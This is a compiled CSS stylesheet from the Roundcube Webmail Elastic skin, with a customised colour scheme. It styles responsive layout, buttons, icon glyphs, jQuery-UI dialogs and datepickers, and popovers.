 @media screen and (min-width: 481px) and (max-width: 1024px) {
   #layout-menu .popover-header img {
     max-width: 35.1px;
   }
 }
 @media screen and (min-width: 481px) {
   #layout-menu .popover-header {
     padding: 0 !important;
     background-color: #000000 !important;
   }
   #layout-menu .popover-header a {
     display: none !important;
   }
 }
 html.layout-phone #layout-menu .popover-header {
   display: flex !important;
   align-items: center;
   justify-content: center;
   padding: 0 0.5rem;
 }
 html.layout-phone #layout-menu .popover-header img {
   max-width: 222px;
 }
 html.layout-phone #layout-menu .popover-header a {
   width: auto;
   flex: 1;
 }
 html.layout-phone #layout-menu .popover-header a:before {
   height: 58px;
   float: right;
 }
 html.layout-phone #layout-menu .popover-header a .inner {
   display: none;
 }
 @media screen and (max-width: 1200px) {
   #layout-sidebar,
   #layout-list {
     min-width: 260px;
     flex: 3;
   }
   #layout-list > .header > a.button {
     padding: 0 0.25rem;
     margin: 0 0.25rem;
   }
 }
 @media screen and (max-width: 768px) {
   #layout-sidebar,
   #layout-list {
     max-width: none;
     border: 0 !important;
   }
   #layout > div > .header {
     background-color: #cfdee6;
   }
   #layout > div > .header a.button {
     margin: 0 0.3rem !important;
     padding: 0 !important;
   }
   #layout > div > .header a.button:before {
     font-size: 1.75rem;
     height: 58px;
     margin: 0;
   }
   #layout > div > .header a.button.filter:before {
     font-size: 1.6rem;
   }
   #layout > div > .header a.button .inner {
     display: none;
   }
   #layout > div > .footer {
     background-color: #cfdee6;
   }
   a.toolbar-list-button {
     display: none;
   }
 }
 @media screen and (max-width: 320px) {
   #layout-sidebar,
   #layout-list {
     min-width: 240px;
   }
 }
 @media screen and (min-width: 481px) {
   a.task-menu-button {
     display: none;
   }
   #layout-menu {
     background-color: #000000;
     width: 42px;
   }
 }
 @media screen and (min-width: 769px) {
   .floating-action-buttons,
   #layout-content > .header > .header-title,
   #layout > div > .header > .buttons,
   a.toolbar-menu-button {
     display: none;
   }
 }
 @media screen and (min-width: 1025px) {
   #layout-menu {
     width: 78px;
   }
 }
 @media screen and (min-width: 1201px) {
   #layout-list > .header > .header-title:not(.all-sizes),
   a.toolbar-list-button,
   a.back-list-button,
   a.back-sidebar-button {
     display: none;
   }
 }
 html.layout-phone .hidden-phone {
   display: none !important;
 }
 html.layout-phone .hidden-small,
 html.layout-small .hidden-small {
   display: none !important;
 }
 html.layout-small .hidden-lbs {
   display: none !important;
 }
 html.layout-large .hidden-lbs,
 html.layout-normal .hidden-lbs,
 html.layout-large .hidden-big,
 html.layout-normal .hidden-big {
   display: none !important;
 }
 html.layout-large .hidden-large {
   display: none !important;
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** Common UI elements ***/
 .rcmaddcontact,
 .hidden,
 .voice {
   display: none !important;
 }
 font.bold {
   font-weight: bold;
 }
 #rcmdraglayer {
   min-width: 260px;
   width: 260px;
   background-color: #000000;
   color: #fff;
   box-shadow: 3px 3px 5px #f1f3f4;
   border-radius: 0.3rem;
   z-index: 250;
   opacity: 0.92;
   padding: 0.5rem;
   white-space: nowrap;
 }
 #rcmdraglayer div {
   line-height: 1.6em;
   overflow: hidden;
   text-overflow: ellipsis;
 }
 .frame-content {
   padding: 1rem;
 }
 .frame-content h2 {
   font-weight: bold;
   font-size: 1.5em;
 }
 .frame-content h3 {
   font-weight: bold;
   font-size: 1.25em;
 }
 .listbox .scroller {
   width: 100%;
   overflow-x: hidden;
   overflow-y: auto;
 }
 .listbox .navlist {
   height: 0;
   flex: initial !important;
 }
 .listbox .navlist .listing tr:last-child td,
 .listbox .navlist .listing li:last-child {
   border-bottom: 0;
 }
 .popup .listbox {
   height: 100%;
   display: flex;
   flex-direction: column;
 }
 .popup .listbox .scroller {
   flex: 1;
 }
 .popup .listbox .footer {
   border-top: 1px solid #d4dbde;
   background-color: #fbfbfb;
 }
 .contact-header {
   display: flex;
   margin-bottom: 1rem;
 }
 .contact-header .contact-photo {
   min-width: 112px;
 }
 .contact-header .contact-head {
   margin-left: 1rem;
   margin-top: 0 !important;
 }
 .contact-header .contact-head legend {
   display: none;
 }
 p.image-attachment {
   position: relative;
   border: 1px solid #ddd;
   border-radius: 0.3rem;
   background-color: rgba(0, 153, 204, 0.05);
   float: left;
   margin: 0.5rem;
   min-width: 47%;
   min-height: 250px;
   overflow: hidden;
   display: flex;
   justify-content: center;
 }
 @media screen and (max-width: 480px) {
   p.image-attachment {
     float: none;
     margin: 0.5rem 0 0.5rem 0;
   }
 }
 p.image-attachment .image-link {
   align-self: center;
   text-align: center;
   margin: 1.6rem 0.5rem;
 }
 p.image-attachment span {
   color: #737677;
   padding: 0 0.5rem;
   font-size: 90%;
   white-space: nowrap;
   position: absolute;
   line-height: 1.5rem;
 }
 p.image-attachment .image-filename {
   overflow: hidden;
   text-overflow: ellipsis;
   left: 0;
   top: 0;
   right: 0;
   padding-right: 4rem;
 }
 p.image-attachment .image-filesize {
   right: 0;
   top: 0;
 }
 p.image-attachment .attachment-links {
   position: absolute;
   bottom: 0;
   left: 0;
   width: 100%;
   text-align: center;
 }
 p.image-attachment .attachment-links a {
   text-decoration: none;
   display: inline-block;
   padding: 0 0.5rem;
   line-height: 1.5rem;
 }
 p.image-attachment .attachment-links a:before {
   display: inline-block;
 }
 p.image-attachment .attachment-links a.open:before {
   content: "\f360";
 }
 p.image-attachment .attachment-links a.download:before {
   content: "\f019";
 }
 fieldset.image-attachment {
   margin-top: 0.5rem;
 }
 fieldset.image-attachment legend {
   color: #737677;
   font-size: 0.9rem;
   border-top: 1px solid #f5f5f5;
   margin: 0;
 }
 fieldset.image-attachment img {
   max-width: 100%;
 }
 #folder-selector {
   overflow-y: auto;
 }
 .noselect {
   user-select: none;
   -moz-user-select: none;
   -khtml-user-select: none;
   -ms-user-select: none;
   -webkit-user-select: none;
 }
 .iframe-loader {
   width: 100%;
   position: absolute;
   top: 0;
   bottom: 0;
   background-color: rgba(255, 255, 255, 0.95);
   display: flex;
   align-items: center;
   justify-content: center;
   z-index: 3;
 }
 .iframe-loader .spinner-border {
   width: 7rem;
   height: 7rem;
   color: #f1f3f4;
   border: 1rem solid;
   border-color: currentColor #737677 currentColor currentColor;
 }
 .footer.toolbar + .iframe-loader {
   top: 58px;
   bottom: 58px;
 }
 .ios-scroll {
   padding: 0;
   -webkit-overflow-scrolling: touch !important;
   overflow: scroll !important;
 }
 .ios-scroll.iframe-wrapper {
   margin-top: 1px;
 }
 .webkit-scroller::-webkit-scrollbar {
   -webkit-appearance: none;
 }
 .webkit-scroller::-webkit-scrollbar:vertical {
   width: 0.5rem;
 }
 .webkit-scroller::-webkit-scrollbar:horizontal {
   height: 0.5rem;
 }
 .webkit-scroller::-webkit-scrollbar-thumb {
   background-color: rgba(0, 0, 0, 0.3);
   border-radius: 0.25rem;
   border: 2px solid #fff;
 }
 .quota-widget {
   width: 100%;
   max-width: 15em;
   padding: 0.5rem 1rem;
   display: flex;
   align-items: center;
   color: #737677;
 }
 .quota-widget:before {
   content: "\f0a0";
   line-height: 1;
 }
 .quota-widget .count {
   color: #737677;
   font-size: 80%;
   order: 2;
 }
 .quota-widget .bar {
   flex: 1;
   height: 0.5rem;
   margin: 0 1rem;
   background-color: #fff;
   border: 1px solid #d4dbde;
   border-radius: 0.25rem;
   overflow: hidden;
 }
 .quota-widget .value {
   display: block;
   background-color: #0099cc;
   height: 1rem;
   opacity: 0.75;
 }
 .quota-widget .value.warning {
   background-color: #EC1313;
 }
 .image-tools {
   position: absolute;
   top: 5rem;
   left: 0;
   height: 58px;
   overflow: hidden;
   transform: translateX(-87%);
   transition: transform 0.3s ease-in-out;
   background-color: rgba(0, 153, 204, 0.4);
   border-radius: 0 0.3rem 0.3rem 0;
 }
 .image-tools .menu {
   float: left;
 }
 .image-tools a.button.icon.tools {
   padding: 0 0.25rem;
   display: inline-block;
   height: 58px;
 }
 .image-tools a.button.icon.tools span.inner {
   display: none;
 }
 .image-tools a.button.icon.tools:before {
   line-height: 58px;
   margin: 0;
 }
 .image-tools.open {
   transform: translateX(0);
 }
 .image-tools.open a.button.icon.tools:before {
   content: "\f053";
 }
 .image-tools a {
   color: #fff !important;
 }
 .image-tools a:focus,
 .image-tools a:hover {
   background-color: rgba(0, 153, 204, 0.5) !important;
   outline: 0;
 }
 .quota-info {
   width: 100%;
   display: table !important;
 }
 .quota-info td,
 .quota-info th {
   text-align: center;
   white-space: nowrap;
 }
 .quota-info th {
   border-top: 0;
 }
 .quota-info .root {
   line-height: 1;
   font-style: italic;
   color: #737677;
   background-color: #f1f3f4;
 }
 .quota-info th:first-child,
 .quota-info .name {
   text-align: left;
 }
 .nav-tabs {
   flex-wrap: nowrap;
 }
 .nav-tabs .nav-item {
   white-space: nowrap;
   overflow: hidden;
 }
 .nav-tabs .nav-link {
   overflow: hidden;
   text-overflow: ellipsis;
 }
 .props-table td.title {
   width: 7em;
 }
 .table-widget {
   display: flex;
   flex-direction: column;
   margin-bottom: 0.5rem;
   border: 1px solid #d4dbde;
 }
 .table-widget > .content {
   overflow-x: auto;
   flex-grow: 1;
   height: 18.5em;
 }
 .table-widget > .content table th {
   border-top: 0;
 }
 .table-widget > .footer {
   height: 3.5rem;
   border-top: 1px solid #d4dbde;
   text-align: left;
 }
 .table-widget > .footer a {
   padding: 0.2rem 0.45rem !important;
   height: 3.5rem !important;
 }
 .table-widget table {
   margin: 0;
   max-height: 18.5em;
 }
 .table-widget table.options-table td,
 .table-widget table.options-table th {
   text-align: center;
   vertical-align: middle;
 }
 .table-widget table.options-table td:first-child,
 .table-widget table.options-table th:first-child {
   overflow: hidden;
   text-overflow: ellipsis;
   text-align: left;
 }
 .table-widget table.options-table tr:last-child td {
   border-bottom: 1px solid #d4dbde;
 }
 .table-widget table.options-table tr.selected td {
   background-color: #0099cc;
   color: #2c363a;
   outline: 0;
 }
 .table-widget table.options-table td:not(:first-child) span {
   display: inline-block;
   line-height: 1.25;
 }
 .table-widget table.options-table td.enabled span:before {
   content: "\f00c";
 }
 .table-widget table.options-table td.partial span:before {
   opacity: 0.3;
   content: "\f00c";
 }
 table.compact-table {
   margin: 0;
   width: 100%;
 }
 table.compact-table *:not(.invalid-feedback) {
   font-size: inherit;
 }
 table.compact-table td {
   padding: 0.25rem;
   border: 0;
 }
 table.compact-table td:first-child {
   padding-left: 0;
 }
 table.compact-table td:last-child {
   padding-right: 0;
 }
 table.table .checkbox-cell {
   width: 3rem;
   white-space: nowrap;
   overflow: hidden;
   text-align: center;
   padding: 0.5rem;
 }
 html.touch table.table .checkbox-cell {
   padding: 0.5rem 0.3rem;
 }
 table.table th.checkbox-cell {
   padding: 0.75rem 0;
   max-width: 1rem;
 }
 table.table th.checkbox-cell:before {
   cursor: pointer;
   margin: 0 1rem;
   line-height: 1;
 }
 table.table th.checkbox-cell.subscription:before {
   content: "\f143";
 }
 table.table th.checkbox-cell.alarm:before {
   content: "\f0f3";
   font-weight: 400;
 }
 table.table th.checkbox-cell.read:before {
   content: "\f06e";
 }
 table.table th.checkbox-cell.write:before {
   content: "\f303";
 }
 table.table .buttons-cell {
   width: 1%;
   white-space: nowrap;
   text-align: center;
 }
 table.table .buttons-cell a.button:before {
   line-height: 1;
   float: none;
   display: inline-block;
 }
 @media screen and (min-width: 480px) {
   table.table .buttons-cell a.button .inner {
     display: inline;
   }
 }
 table.table label {
   margin: 0;
   display: inline;
 }
 fieldset.tab-pane table.table thead th {
   border: 0;
 }
 table.table tr.deleted td {
   color: rgba(44, 54, 58, 0.5) !important;
 }
 /* Bootstrap's .table style overwrites */
 .table thead th {
   border-width: 1px;
   white-space: nowrap;
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** Buttons ***/
 .button.disabled {
   opacity: 0.5;
 }
 a.button {
   text-decoration: none;
 }
 /* font-icons */
 a.button.icon.sidebar-menu:before,
 button.btn.sidebar-menu:before,
 a.button.icon.toolbar-menu-button:before,
 button.btn.toolbar-menu-button:before,
 a.button.icon.toolbar-list-button:before,
 button.btn.toolbar-list-button:before {
   content: "\f142";
   width: 1em;
 }
 a.button.icon.task-menu-button:before,
 button.btn.task-menu-button:before {
   content: "\f0c9";
 }
 a.button.icon.back-sidebar-button:before,
 button.btn.back-sidebar-button:before,
 a.button.icon.back-content-button:before,
 button.btn.back-content-button:before,
 a.button.icon.back-list-button:before,
 button.btn.back-list-button:before {
   content: "\f053";
 }
 a.button.icon.refresh:before,
 button.btn.refresh:before {
   content: "\f021";
 }
 a.button.icon.generate:before,
 button.btn.generate:before,
 a.button.icon.yes:before,
 button.btn.yes:before,
 a.button.icon.submit:before,
 button.btn.submit:before,
 a.button.icon.continue:before,
 button.btn.continue:before,
 a.button.icon.save:before,
 button.btn.save:before {
   content: "\f00c";
 }
 a.button.icon.create:before,
 button.btn.create:before {
   content: "\f0fe";
 }
 a.button.icon.edit:before,
 button.btn.edit:before {
   content: "\f303";
 }
 a.button.icon.qrcode:before,
 button.btn.qrcode:before {
   content: "\f029";
 }
 a.button.icon.search:before,
 button.btn.search:before {
   content: "\f002";
 }
 a.button.icon.filter:before,
 button.btn.filter:before {
   content: "\f0b0";
   font-size: 1.2em;
 }
 a.button.icon.import:before,
 button.btn.import:before {
   content: "\f093";
 }
 a.button.icon.export:before,
 button.btn.export:before {
   content: "\f019";
 }
 a.button.icon.discard:before,
 button.btn.discard:before,
 a.button.icon.delete:before,
 button.btn.delete:before {
   content: "\f2ed";
   font-weight: 400;
 }
 a.button.icon.next:before,
 button.btn.next:before {
   content: "\f061";
 }
 a.button.icon.restore:before,
 button.btn.restore:before {
   content: "\f0e2";
 }
 a.button.icon.send:before,
 button.btn.send:before,
 a.button.icon.bounce:before,
 button.btn.bounce:before {
   content: "\f1d8";
 }
 a.button.icon.attach:before,
 button.btn.attach:before {
   content: "\f0c6";
 }
 a.button.icon.attach.vcard:before,
 button.btn.attach.vcard:before {
   content: "\f007";
 }
 a.button.icon.no:before,
 button.btn.no:before,
 a.button.icon.close:before,
 button.btn.close:before,
 a.button.icon.cancel:before,
 button.btn.cancel:before {
   content: "\f00d";
 }
 a.button.icon.back:before,
 button.btn.back:before {
   content: "\f053";
 }
 a.button.icon.remove:before,
 button.btn.remove:before {
   content: "\f00d";
 }
 a.button.icon.unlock:before,
 button.btn.unlock:before {
   content: "\f09c";
 }
 a.button.icon.help:before,
 button.btn.help:before {
   content: "\f1cd";
   font-weight: 400;
 }
 a.button.icon.folders:before,
 button.btn.folders:before {
   content: "\f07c";
 }
 a.button.icon.options:before,
 button.btn.options:before {
   content: "\f1de";
 }
 a.button.icon.tools:before,
 button.btn.tools:before,
 a.button.icon.settings:before,
 button.btn.settings:before {
   content: "\f013";
 }
 a.button.icon.properties:before,
 button.btn.properties:before {
   content: "\f05a";
 }
 a.button.icon.selection:before,
 button.btn.selection:before {
   content: "\f14a";
   font-weight: 400;
 }
 a.button.icon.insert.recipient:before,
 button.btn.insert.recipient:before {
   content: "\f234";
 }
 a.button.icon.encrypt:before,
 button.btn.encrypt:before {
   content: "\f023";
 }
 a.button.icon.sign:before,
 button.btn.sign:before {
   content: "\f5b7";
 }
 a.button.icon.sso:before,
 button.btn.sso:before {
   content: "\f2f6";
 }
 a.btn:before,
 button.btn:before {
   display: inline !important;
   float: none !important;
   vertical-align: middle;
   margin-right: 0.4rem !important;
 }
 a.button.icon.dropdown:before {
   content: "\f0d7";
   font-size: 1em;
 }
 a.button.icon > span.inner {
   display: none;
 }
 html.touch .btn:focus {
   box-shadow: none !important;
 }
 .floating-action-buttons {
   position: absolute;
   right: 0;
   bottom: 0;
 }
 .footer:not(:empty) + .floating-action-buttons {
   bottom: 35px;
 }
 .floating-action-buttons a.button {
   display: block;
   float: left;
   width: 4rem;
   height: 4rem;
   border-radius: 50%;
   background: #0099cc;
   color: white;
   opacity: 0.95;
   box-shadow: 0 0 5px 5px #80dfff;
   margin: 0 1rem 1rem 0;
 }
 .floating-action-buttons a.button:before {
   content: "\f067";
   width: 4rem;
   height: 4rem;
   line-height: 4rem;
 }
 .floating-action-buttons a.button.compose:before {
   content: "\f304";
 }
 .floating-action-buttons a.button .inner {
   display: none;
 }
 /*** Bootstrap button style overrides ***/
 .btn:focus {
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.3);
 }
 .btn-secondary {
   color: #fff;
   background: #8b9fa7;
   border-color: #8b9fa7;
 }
 .btn-secondary:focus {
   box-shadow: 0 0 0 0.2rem rgba(139, 159, 167, 0.5);
 }
 .btn-secondary:hover {
   background: #7c939c;
   border-color: #778e98;
 }
 .btn-secondary.disabled,
 .btn-secondary:disabled {
   background: #c5cfd3;
   border-color: #c5cfd3;
   opacity: 1;
 }
 .btn-secondary:not(:disabled):not(.disabled):active,
 .btn-secondary:not(:disabled):not(.disabled).active {
   background: #6e8791;
   border-color: #6a828b;
 }
 .btn-secondary:not(:disabled):not(.disabled):active:focus,
 .btn-secondary:not(:disabled):not(.disabled).active:focus {
   box-shadow: 0 0 0 0.2rem rgba(139, 159, 167, 0.53);
 }
 .btn-primary {
   color: #fff;
   background: #0099cc;
   border-color: #0099cc;
 }
 .btn-primary:focus {
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.5);
 }
 .btn-primary:hover {
   background: #0086b3;
   border-color: #007ea8;
 }
 .btn-primary.disabled,
 .btn-primary:disabled {
   background: #33ccff;
   border-color: #33ccff;
   opacity: 1;
 }
 .btn-primary:not(:disabled):not(.disabled):active,
 .btn-primary:not(:disabled):not(.disabled).active {
   background: #007399;
   border-color: #006b8f;
 }
 .btn-primary:not(:disabled):not(.disabled):active:focus,
 .btn-primary:not(:disabled):not(.disabled).active:focus {
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.53);
 }
 .btn-danger {
   color: #fff;
   background: #EC1313;
   border-color: #EC1313;
 }
 .btn-danger:focus {
   box-shadow: 0 0 0 0.2rem rgba(236, 19, 19, 0.5);
 }
 .btn-danger:hover {
   background: #d41111;
   border-color: #cb1010;
 }
 .btn-danger.disabled,
 .btn-danger:disabled {
   background: #f47171;
   border-color: #f47171;
   opacity: 1;
 }
 .btn-danger:not(:disabled):not(.disabled):active,
 .btn-danger:not(:disabled):not(.disabled).active {
   background: #bd0f0f;
   border-color: #b30e0e;
 }
 .btn-danger:not(:disabled):not(.disabled):active:focus,
 .btn-danger:not(:disabled):not(.disabled).active:focus {
   box-shadow: 0 0 0 0.2rem rgba(236, 19, 19, 0.53);
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** jQuery-UI widgets' style overrides ***/
 .ui-widget-overlay {
   background-color: rgba(44, 54, 58, 0.5);
   opacity: 1 !important;
 }
 .ui-widget-overlay.datepicker {
   z-index: 119;
 }
 .ui-widget {
   border: 1px solid #d4dbde;
   box-shadow: 3px 3px 5px #f1f3f4;
   border-radius: 0.3rem;
 }
 .ui-menu {
   overflow-y: auto;
   overflow-x: hidden;
   max-height: 400px;
   border-radius: 0.3rem;
   z-index: 240;
   position: absolute;
 }
 .ui-menu .ui-state-active {
   border: 0 !important;
   background-color: #0099cc !important;
 }
 .ui-menu .ui-menu-item {
   white-space: nowrap;
   cursor: default;
 }
 .ui-menu .ui-menu-item-wrapper {
   margin: 0 !important;
 }
 .ui-dialog {
   border-radius: 0;
   box-shadow: none;
 }
 .ui-dialog.no-titlebar .ui-dialog-titlebar {
   display: none;
 }
 .ui-dialog .ui-dialog-titlebar {
   height: 58px;
   border-bottom: 1px solid #ddd;
 }
 .ui-dialog .ui-dialog-titlebar button:before {
   margin: 0;
 }
 .ui-dialog .ui-dialog-title {
   line-height: 58px;
   font-size: 1.25rem;
   padding: 0 3rem 0 1rem;
   color: #2c363a;
 }
 .ui-dialog .ui-dialog-titlebar-close {
   border: 0;
   color: #2c363a;
   background: transparent;
   right: 0;
   top: 0;
   position: absolute;
   padding: 0.25rem 0.5rem;
   margin: 15px 0.5rem;
 }
 .ui-dialog .ui-dialog-titlebar-close:before {
   content: "\f00d";
   line-height: 1.5rem;
   margin: 0 !important;
 }
 .ui-dialog .ui-dialog-content > .popupmenu {
   display: block !important;
 }
 .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset {
   display: flex;
   justify-content: flex-end;
 }
 .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset a.btn-link,
 .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button {
   overflow: hidden;
   text-overflow: ellipsis;
   min-width: 5rem;
   margin: 9px 4px;
 }
 .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset a.btn-link:last-child,
 .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button:last-child {
   margin-right: 0;
 }
 .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset a.btn-link {
   padding-right: 0;
   padding-left: 0;
   text-decoration: none;
   color: #2c363a;
 }
 .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset a.btn-link:focus {
   background-color: rgba(0, 153, 204, 0.5);
 }
 .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset a.btn-link.options {
   order: -1;
   padding: 0.375rem 0.25rem;
   margin-right: 0.3rem;
 }
 .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset a.btn-link.options:before {
   content: "\f013";
   width: 100%;
   height: 1.25em;
 }
 .ui-dialog iframe,
 .ui-dialog .ui-dialog-content.iframe {
   padding: 0;
   width: 100% !important;
   height: 100%;
   border: 0;
   overflow: hidden;
 }
 .ui-dialog,
 .ui-dialog-content {
   box-sizing: initial;
 }
 .ui-widget-content .ui-icon.ui-resizable-se {
   background: url("data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20version%3D%221.1%22%20width%3D%22512px%22%20height%3D%22512px%22%20viewBox%3D%220%200%2016%2016%22%3E%0A%3Cpath%20fill%3D%22%23888888%22%20d%3D%22M6.7%2016l9.3-9.3v-1.4l-10.7%2010.7z%22%2F%3E%0A%3Cpath%20fill%3D%22%23888888%22%20d%3D%22M9.7%2016l6.3-6.3v-1.4l-7.7%207.7z%22%2F%3E%0A%3Cpath%20fill%3D%22%23888888%22%20d%3D%22M12.7%2016l3.3-3.3v-1.4l-4.7%204.7z%22%2F%3E%0A%3Cpath%20fill%3D%22%23888888%22%20d%3D%22M15.7%2016l0.3-0.3v-1.4l-1.7%201.7z%22%2F%3E%0A%3C%2Fsvg%3E%0A");
 }
 /* FIXME: why do I need !important here? */
 @media screen and (max-width: 480px) {
   .ui-dialog {
     width: 100% !important;
     height: 100% !important;
     display: flex;
     flex-direction: column;
     border: 0;
     top: 0 !important;
   }
   .ui-dialog .ui-resizable-handle,
   .ui-dialog .ui-dialog-titlebar-close {
     display: none !important;
   }
   .ui-dialog .ui-dialog-titlebar {
     height: 58px;
     text-align: center;
     background-color: #cfdee6;
   }
   .ui-dialog .ui-dialog-title {
     line-height: 58px;
     font-size: 1rem;
     padding: 0 1rem;
   }
   .ui-dialog .ui-dialog-content {
     flex: 1;
   }
   .ui-dialog .ui-dialog-content:not(.iframe) {
     padding: 1rem;
   }
   .ui-dialog .ui-dialog-buttonpane {
     padding: 0 !important;
     text-align: center !important;
     border-top: 1px solid #ddd;
     height: 58px !important;
     background-color: #cfdee6;
   }
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset {
     justify-content: space-around;
   }
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button {
     margin: 0 !important;
     padding: 0.45rem;
     border: 0 !important;
     height: 58px;
     box-shadow: none;
     font-size: 90%;
     line-height: 1.5;
   }
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button:before {
     display: block !important;
     float: none;
     width: auto;
     height: 1.75rem;
     line-height: 1.75;
     margin: 0 !important;
   }
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button:active {
     box-shadow: none;
   }
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button.btn-primary,
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button.btn-secondary {
     color: #2c363a;
     background: transparent;
   }
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button.btn-danger {
     color: #EC1313;
     background: transparent;
   }
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button.disabled,
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button:disabled {
     opacity: 0.5;
   }
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset button.cancel {
     order: 100;
   }
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset a.btn-link {
     color: #2c363a;
     margin: 0;
     padding: 0.45rem;
     font-size: 90%;
   }
   .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset a.btn-link.options:before {
     display: block !important;
     height: 1.75rem;
     line-height: 1.75;
     margin: 0;
   }
 }
 /* Slider widget */
 .ui-slider {
   box-shadow: none;
 }
 .ui-slider .ui-slider-range {
   border-radius: 0.3rem;
   background: #66d9ff;
 }
 .ui-slider .ui-slider-handle {
   border-radius: 0.3rem;
 }
 .ui-slider .ui-slider-handle.ui-state-active {
   background: #0099cc;
   border-color: #00131a;
 }
 /* Datepicker widget */
 .ui-datepicker {
   margin: calc(50vh - 10em) calc(50vw - 10em) !important;
   top: 0 !important;
   left: 0 !important;
   box-shadow: none;
   user-select: none;
 }
 .ui-datepicker:not(.ui-datepicker-inline) {
   z-index: 120 !important;
 }
 .ui-datepicker .ui-datepicker-header,
 .ui-datepicker .ui-datepicker-title {
   line-height: 4rem;
   height: 4rem;
   padding: 0;
 }
 .ui-datepicker .ui-datepicker-header {
   border-bottom: 1px solid #ddd;
 }
 .ui-datepicker .ui-datepicker-header a {
   height: 4rem;
 }
 .ui-datepicker .ui-datepicker-header select {
   display: inline-block;
 }
 .ui-datepicker .ui-icon {
   background-image: none !important;
   background-position: none !important;
 }
 .ui-datepicker .ui-datepicker-prev,
 .ui-datepicker .ui-datepicker-next {
   cursor: pointer;
   width: auto;
 }
 .ui-datepicker .ui-datepicker-prev:before,
 .ui-datepicker .ui-datepicker-next:before {
   content: "\f053";
   margin: 0 0.25em;
   height: auto;
   width: 1em;
 }
 .ui-datepicker .ui-datepicker-prev:before {
   content: "\f053";
 }
 .ui-datepicker .ui-datepicker-next:before {
   content: "\f054";
 }
 .ui-datepicker td a {
   padding: 0;
   line-height: 1.8em;
   border-radius: 0.3rem;
 }
 .ui-datepicker .ui-state-default,
 .ui-datepicker.ui-widget-content .ui-state-default {
   border: 0;
   background: transparent;
   color: #2c363a;
 }
 .ui-datepicker .ui-datepicker-days-cell-over a,
 .ui-datepicker .ui-datepicker-days-cell-over a.ui-state-default,
 .ui-datepicker .ui-state-highlight,
 .ui-datepicker.ui-widget-content .ui-state-highlight {
   background: #66d9ff;
   color: #0099cc;
 }
 .ui-datepicker a.ui-state-active {
   background: #0099cc !important;
   color: #fff !important;
   font-weight: bold;
 }
 .ui-datepicker html.touch td a {
   font-size: 1.2em;
   line-height: 2.2em;
 }
 .input-group > .form-control.hasDatepicker {
   position: initial;
 }
 .minicolors-panel {
   border: 1px solid #d4dbde;
   box-shadow: 3px 3px 5px #f1f3f4;
   border-radius: 0.3rem;
   height: 152px;
   padding: 1px;
 }
 .input-group .minicolors-input {
   width: 100%;
   min-width: 130px;
   border-left: 0;
   border-right: 0;
 }
 @media screen and (max-width: 320px) {
   .ui-widget-content {
     border-radius: 0;
   }
   .ui-menu {
     border-radius: 0.3rem;
     left: 15px !important;
     right: 15px;
     width: auto;
   }
   .ui-dialog .ui-dialog-content:not(.iframe) {
     padding: 0.65rem;
   }
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** Dialogs and popovers ***/
 .popupmenu {
   display: none;
   padding: 0;
   min-width: 180px;
   height: 100%;
 }
 .popupmenu li > a {
   width: 100%;
 }
 .popupmenu.propform {
   overflow: hidden;
   padding: 0.25rem;
 }
 .popupmenu.simplelist {
   min-width: 80px;
 }
 .popup.justified {
   display: flex;
   justify-content: space-around;
 }
 .popover-body {
   padding: 0;
   overflow-x: hidden;
 }
 .popover-body > .popupmenu {
   display: block !important;
 }
 .popover {
   box-shadow: 3px 3px 5px #f1f3f4;
   border-color: #d4dbde;
   padding: 0;
 }
 .popover .popover-header {
   display: none;
 }
 @media screen and (min-width: 769px) {
   .popover .listing li:first-child {
     border-radius: 0.25rem 0.25rem 0 0;
   }
   .popover .listing li:last-child {
     border-radius: 0 0 0.25rem 0.25rem;
   }
 }
 #rcmKSearchpane {
   width: auto;
   height: auto;
 }
 #rcmKSearchpane li {
   padding-right: 0.5rem;
 }
